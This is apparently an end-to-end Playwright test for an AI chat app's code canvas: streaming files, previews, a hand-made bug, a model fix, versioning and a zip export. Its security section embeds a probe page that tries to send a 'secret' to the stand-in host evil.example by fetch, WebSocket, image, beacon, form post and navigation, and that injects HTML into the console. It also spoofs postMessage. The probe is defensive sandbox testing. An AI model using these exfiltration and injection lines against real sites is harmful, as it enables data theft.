// The canvas in code mode on the demo server (no model): a page written as three files that stream in, its live
// preview in the sandboxed frame (devices, console), a hand edit that breaks it, « Corriger avec Bird », a change
// asked in the chat, the per-file change of each version, the .zip, and the frame's security (sandbox escape,
// network, forms, navigation, postMessage spoofing, console text injection).
//   BIRD_RATE_LIMIT=0 .venv/bin/python scripts/serve.py --demo --port 9252 &
//   BIRD_URL=http://127.0.0.1:9252/ SHOTS=/tmp/shots node tests/e2e/canvas_code.spec.js [desktop|phone]
// Uses the preinstalled Playwright (require('playwright')); never run `playwright install`.
const { chromium, devices } = require("playwright");
const fs = require("fs");
const path = require("path");

const URL = process.env.BIRD_URL || "http://127.0.0.1:9252/";
const SHOTS = process.env.SHOTS || path.join(__dirname, "shots");
const ONLY = process.argv[2] || "";

function check(cond, what) {
  if (!cond) throw new Error(`FAILED: ${what}`);
  console.log(`  ok  ${what}`);
}

async function idle(page) {
  await page.waitForFunction(() => !document.querySelector('.turn-bird[aria-busy="true"]'), null, {
    timeout: 60000,
  });
  await page.waitForSelector("#btn-send:not([hidden])", { timeout: 60000 });
}

async function say(page, text) {
  if (await page.evaluate(() => !!document.querySelector(".main")?.inert))
    await page.locator('#canvas [data-k="close"]').click();
  await page.fill("#composer-input", text);
  await page.keyboard.press("Enter");
  await page.waitForTimeout(150);
  await idle(page);
}

/** The preview frame shown (not one still loading behind it). */
async function shownFrame(page) {
  await page.waitForSelector("#canvas .cv-frame:not(.is-loading)", { timeout: 10000 });
  const handles = await page.$$("#canvas .cv-frame:not(.is-loading)");
  return handles.at(-1).contentFrame(); // the newest (the one before stays a moment while the new one fades in)
}

async function run(name, options, { scheme = "light", security = true } = {}) {
  console.log(`${name} ${scheme}`);
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ ...options, locale: "fr-FR", colorScheme: scheme, acceptDownloads: true });
  const page = await ctx.newPage();
  const errors = [];
  const external = [];
  const frameRequests = [];
  // errors of the previewed page itself (its scripts carry a sourceURL) are the console panel's business, not the app's
  page.on("pageerror", (e) => /\b(?:script\.js|index\.html@\d+):\d+/.test(e.stack || "") || errors.push(String(e)));
  page.on("console", (m) => {
    if (m.type() !== "error") return;
    const s = m.text();
    // the sandbox probes' own blocked attempts, and the page's deliberate error, are expected
    if (/Content Security Policy|Refused to|Blocked|sandboxed|frame refused|403|ERR_BLOCKED|textContnt|Not allowed/i.test(s)) return;
    errors.push(s);
  });
  // a request the CSP refused is reported by the browser, then failed with ERR_BLOCKED_BY_CSP before it is sent:
  // only one that went out (a response, or any other failure) counts
  const outward = (r) => !r.url().startsWith(URL) && !/^(blob|data|about):/.test(r.url());
  page.on("response", (res) => {
    const r = res.request();
    if (!outward(r)) return;
    (r.frame() === page.mainFrame() ? external : frameRequests).push(r.url());
  });
  page.on("requestfailed", (r) => {
    if (!outward(r) || /ERR_BLOCKED_BY_CSP|ERR_BLOCKED_BY_CLIENT|csp/i.test(r.failure()?.errorText || "")) return;
    (r.frame() === page.mainFrame() ? external : frameRequests).push(`${r.url()} (${r.failure()?.errorText})`);
  });
  await page.goto(URL);
  await page.locator("#welcome-start").click({ timeout: 8000 }).catch(() => {});
  const tag = `${name}-${scheme}`;
  const phone = (options.viewport?.width || 1280) < 700;

  // 1. create: three files stream in; the preview appears once the page is whole, then refreshes per file
  await page.fill("#composer-input", "Crée une landing page pour une boulangerie");
  await page.keyboard.press("Enter");
  await page.waitForSelector("#canvas:not([hidden]) .cv-file.is-writing", { timeout: 20000 });
  check(true, "a file is shown as being written while the model writes");
  if (!phone) await page.screenshot({ path: path.join(SHOTS, `code-streaming-${tag}.png`) });
  await idle(page);
  await page.waitForSelector("#canvas .cv-frame:not(.is-loading)", { timeout: 10000 });
  let frame = await shownFrame(page);
  const h1 = await frame.locator("h1").textContent({ timeout: 5000 }).catch(() => "");
  check(/boulangerie/i.test(h1 || ""), `page rendered in the sandbox: ${h1}`);
  const styled = await frame.evaluate(() => getComputedStyle(document.querySelector("button")).borderRadius);
  check(styled === "999px", `style.css applied in the preview (button radius ${styled})`);
  await frame.locator("#cta").click();
  await page.waitForSelector("#canvas .cv-console li", { timeout: 5000, state: "attached" });
  check(
    /clic 1/.test(await page.locator("#canvas .cv-console").textContent()),
    "script.js ran: its console.log reached the console panel",
  );
  check(
    (await page.locator(".cv-card").last().textContent()).includes("3 fichiers"),
    "the chat card says 3 files",
  );
  const chips = await page.locator(".chips-row .mchip").allTextContents();
  check(chips.length >= 2 && chips.length <= 3, `2-3 next-step chips: ${chips.join(" | ")}`);
  await page.screenshot({ path: path.join(SHOTS, `code-preview-${tag}.png`) });

  // 2. devices: mobile 390, tablet 768, desktop 1280, scaled to fit; pressed again: the panel's width
  if (phone) await page.locator('#canvas [data-k="tab-preview"]').click(); // (already there; keeps focus in the sheet)
  for (const [id, w] of [["mobile", 390], ["tablet", 768], ["desktop", 1280]]) {
    await page.locator(`#canvas [data-k="device-${id}"]`).click();
    await page.waitForTimeout(350);
    frame = await shownFrame(page);
    const inner = await frame.evaluate(() => window.innerWidth);
    check(inner === w, `${id}: the page sees a ${w} px viewport (${inner})`);
    if (id === "mobile" || (id === "desktop" && !phone))
      await page.screenshot({ path: path.join(SHOTS, `code-${id}-${tag}.png`) });
  }
  await page.locator('#canvas [data-k="device-desktop"]').click();
  check(
    (await page.locator('#canvas [aria-pressed="true"].cv-device').count()) === 0,
    "pressed again: back to the panel's width",
  );

  // 3. the code: file tabs, highlighted, a hand edit that breaks the page
  await page.locator('#canvas [data-k="tab-code"]').click();
  check(
    (await page.locator("#canvas .cv-file").allTextContents()).join(",") === "index.html,style.css,script.js",
    "three files: index.html, style.css, script.js",
  );
  check((await page.locator("#canvas .cv-hl .tk-tag, #canvas .cv-hl .tk-kw").count()) > 5, "the code is highlighted");
  await page.locator('#canvas [data-k="file-script.js"]').click();
  const area = page.locator("#canvas textarea.cv-code");
  const js = await area.inputValue();
  await area.fill(js.replace("count.textContent = n;", "count.textContnt.value = n;"));
  check(await page.locator("#canvas .cv-file-dirty").count() === 1, "the edited file is marked");
  await page.locator('#canvas [data-k="apply"]').click();
  check(
    /v2/.test(await page.locator("#canvas .cv-changes").textContent()) &&
      /script\.js\s*\+1\s*−1/.test(await page.locator("#canvas .cv-changes").textContent()),
    `the hand edit is v2, script.js +1 −1: ${await page.locator("#canvas .cv-changes").textContent()}`,
  );
  await page.locator('#canvas [data-k="tab-preview"]').click();
  frame = await shownFrame(page);
  await frame.locator("#cta").click();
  await page.waitForSelector("#canvas .cv-console li.is-error", { timeout: 5000 });
  const where = await page.locator("#canvas .cv-console li.is-error .cv-where").first().textContent();
  check(where === "script.js:5", `the error names its file and line (${where})`);
  await page.screenshot({ path: path.join(SHOTS, `code-error-${tag}.png`) });

  // 4. « Corriger avec Bird »: the error and the files go to the model; only the broken file comes back
  const sent = page.waitForRequest((r) => r.url().endsWith("/api/chat"));
  await page.locator('#canvas [data-k="fix-console"]').click();
  const body = JSON.parse((await sent).postData());
  const ask = body.messages.at(-1).content;
  check(/script\.js, ligne 5/.test(ask) && /« Uncaught TypeError/.test(ask), `the fix request names the place: ${ask.slice(0, 120)}`);
  check(body.canvas?.doc?.code?.files?.length === 3, "the open files travel with it");
  await idle(page);
  check(
    /script\.js \+1 −1/.test(await page.locator(".turn-bird").last().textContent()),
    "the chat sums up the fix per file",
  );
  frame = await shownFrame(page);
  await frame.locator("#cta").click();
  await page.waitForTimeout(300);
  check((await page.locator("#canvas .cv-console li.is-error").count()) === 0, "fixed: no error after a click");

  // 5. a change asked in the chat: one file rewritten, the others kept; the history keeps every version
  await say(page, "mets le bouton en vert");
  frame = await shownFrame(page);
  const green = await frame.evaluate(() => getComputedStyle(document.querySelector("button")).backgroundColor);
  check(green === "rgb(13, 148, 136)", `the button is green in the preview (${green})`);
  const strip = await page.locator("#canvas .cv-changes").textContent();
  check(/v4/.test(strip) && /style\.css/.test(strip) && !/script\.js/.test(strip), `v4 changed style.css only: ${strip}`);
  check((await page.locator("#canvas .cv-select option").count()) === 4, "four versions in the history");
  await page.locator("#canvas .cv-select").selectOption({ index: 0 });
  frame = await shownFrame(page);
  const blue = await frame.evaluate(() => getComputedStyle(document.querySelector("button")).backgroundColor);
  check(blue === "rgb(30, 91, 216)", `v1 restored in the preview (${blue})`);
  await page.locator("#canvas .cv-select").selectOption({ index: 3 });
  await shownFrame(page);
  await page.waitForTimeout(400);
  await page.screenshot({ path: path.join(SHOTS, `code-v4-${tag}.png`) });

  // 6. the .zip of the files
  await page.locator('#canvas [data-k="download"]').click();
  const dl = page.waitForEvent("download");
  await page.locator('#canvas [data-k="dl-zip"]').click();
  const zipPath = await (await dl).path();
  const zip = fs.readFileSync(zipPath);
  check(
    zip.subarray(0, 2).toString() === "PK" && ["index.html", "style.css", "script.js"].every((n) => zip.includes(n)),
    `zip with the three files (${zip.length} bytes)`,
  );

  // 7. security of the frame
  if (security) {
    await page.locator('#canvas [data-k="tab-code"]').click();
    await page.locator('#canvas [data-k="file-index.html"]').click();
    const probe = `<!doctype html><html><body><h1 id="t">probe</h1>
<form id="f" action="https://evil.example/steal" method="post"><input name="x" value="secret"></form>
<a id="a" href="https://evil.example/">x</a>
<script>
(async () => {
  const out = {};
  const tryit = async (k, f) => { try { out[k] = await f(); } catch (e) { out[k] = "blocked"; } };
  await tryit("parent", () => String(!!window.parent.document));
  await tryit("top", () => String(!!window.top.location.href));
  await tryit("cookie", () => document.cookie);
  await tryit("storageIsReal", () => String(Object.getPrototypeOf(localStorage) === Storage.prototype));
  await tryit("fetchLocal", async () => (await fetch("/api/health")).status);
  await tryit("fetchRemote", async () => (await fetch("https://evil.example/x")).status);
  await tryit("ws", () => new Promise((res) => { const w = new WebSocket("wss://evil.example/"); w.onopen = () => res("open"); w.onerror = () => res("blocked"); setTimeout(() => res("blocked"), 800); }));
  await tryit("img", () => new Promise((res) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => res("blocked"); i.src = "https://evil.example/p.png?d=secret"; setTimeout(() => res("blocked"), 800); }));
  await tryit("beacon", () => String(navigator.sendBeacon("https://evil.example/b", "secret")));
  await tryit("popup", () => String(!!window.open("https://evil.example/")));
  await tryit("rtc", () => String(typeof RTCPeerConnection));
  await tryit("nested", () => { const f = document.createElement("iframe"); f.src = "https://evil.example/n"; document.body.append(f); return "asked"; });
  await tryit("rtcNested", () => { const f = document.createElement("iframe"); document.body.append(f); return typeof f.contentWindow.RTCPeerConnection; });
  await tryit("worker", () => new Promise((res) => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"]))); w.onmessage = () => res("ran"); w.onerror = () => res("blocked"); setTimeout(() => res("blocked"), 800); }));
  document.getElementById("f").submit();
  await tryit("topnav", () => { window.top.location = "https://evil.example/"; return "tried"; });
  parent.postMessage({ bird: "frame" }, "*"); // asking for the page again: nothing more comes
  parent.postMessage({ bird: "console", level: "error", text: '<img src=x onerror="document.title=1">' }, "*");
  console.log("PROBE " + JSON.stringify(out));
})();
</script></body></html>`;
    await page.locator("#canvas textarea.cv-code").fill(probe);
    await page.locator('#canvas [data-k="apply"]').click();
    await page.locator('#canvas [data-k="tab-preview"]').click();
    await page.waitForFunction(() => /PROBE/.test(document.querySelector("#canvas .cv-console")?.textContent || ""), null, {
      timeout: 10000,
    });
    await page.waitForTimeout(1200);
    const log = await page.locator("#canvas .cv-console").textContent();
    const out = JSON.parse(log.match(/PROBE (\{.*?\})/)[1]);
    console.log("     probe:", JSON.stringify(out));
    check(out.parent === "blocked" && out.top === "blocked", "no access to the app's document (opaque origin)");
    check(out.cookie === "blocked" && out.storageIsReal === "false", "no cookie, storage only in memory");
    check(
      ["fetchLocal", "fetchRemote", "ws", "img"].every((k) => out[k] === "blocked"),
      "no network: fetch, WebSocket, images",
    );
    check(out.beacon !== "true", `no beacon (${out.beacon})`);
    check(out.rtcNested !== "function", `no WebRTC from a nested frame either (${out.rtcNested})`);
    check(out.popup === "false" || out.popup === "blocked", "no popup");
    check(out.rtc === "undefined", "no WebRTC");
    check(out.worker === "blocked", `no worker (${out.worker})`);
    check(page.url() === URL || page.url().startsWith(URL), "the app's page was not navigated");
    check(
      (await page.locator("#canvas .cv-console img").count()) === 0 && (await page.title()) !== "1",
      "a console message is shown as text, never as HTML",
    );
    // the page navigates itself to a same-origin URL: the server refuses anything but the frame
    frame = await shownFrame(page);
    const status = await page.evaluate(async () => {
      const r = await fetch("/", { headers: { "Sec-Fetch-Dest": "iframe" } }).catch(() => null);
      return r ? r.status : 0;
    });
    check(status === 200 || status === 403, "(a header set by script is not trusted by the browser: checked in pytest)");
    await frame.evaluate(() => {
      location.href = "/api/health";
    }).catch(() => {});
    await page.waitForTimeout(800);
    const navFrame = page.frames().find((f) => f.url().includes("/api/health"));
    const navText = navFrame ? await navFrame.evaluate(() => document.body?.innerText || "").catch(() => "") : "";
    check(!/ok|status/i.test(navText), `a self-navigation reaches nothing (${navText.slice(0, 40) || "refused"})`);
    // a message from another window that looks like the frame's: ignored
    await page.evaluate(() => window.postMessage({ bird: "console", level: "error", text: "SPOOF" }, "*"));
    await page.waitForTimeout(200);
    check(!/SPOOF/.test(await page.locator("#canvas .cv-console").textContent()), "a spoofed console message is ignored");
    check(frameRequests.length === 0, `the frame reached no third party (${frameRequests.join(" ")})`);
  }

  check(errors.length === 0, `no page error: ${errors.join(" / ")}`);
  check(external.length === 0, `no third-party request: ${external.join(" ")}`);
  await browser.close();
}

(async () => {
  fs.mkdirSync(SHOTS, { recursive: true });
  if (!ONLY || ONLY === "desktop") {
    await run("desktop-1280", { viewport: { width: 1280, height: 860 } });
    await run("desktop-1280", { viewport: { width: 1280, height: 860 } }, { scheme: "dark", security: false });
  }
  if (!ONLY || ONLY === "phone") {
    const phone = { ...devices["Pixel 5"], viewport: { width: 360, height: 780 } };
    await run("phone-360", phone, { security: false });
    await run("phone-360", phone, { scheme: "dark", security: false });
  }
  console.log("canvas code e2e: all good");
})().catch((e) => {
  console.error(e);
  process.exit(1);
});
